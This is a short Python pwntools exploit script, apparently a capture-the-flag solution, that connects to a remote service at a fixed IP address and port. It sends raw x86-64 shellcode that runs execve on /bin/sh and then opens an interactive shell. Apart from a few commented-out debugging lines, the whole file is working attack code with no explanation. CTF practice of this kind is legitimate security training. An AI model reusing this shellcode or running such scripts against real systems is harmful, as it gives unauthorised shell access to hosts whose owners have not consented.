from pwn import *
context.arch = 'amd64'

#io = process("./shellcode")
io = remote('34.92.37.22', 10002)
#gdb.attach(io,'handle SIGALRM nostop noprint\nb *0x4008cb\nc')

io.recvuntil(":\n")
io.sendline('\x00\x6a\x3b\xeb\x10\x48\x31\xc0\x5f\x48\x31\xf6\x48\x31\xd2\x48\x83\xc0\x3b\x0f\x05'+'\xe8\xeb\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00')
io.interactive()
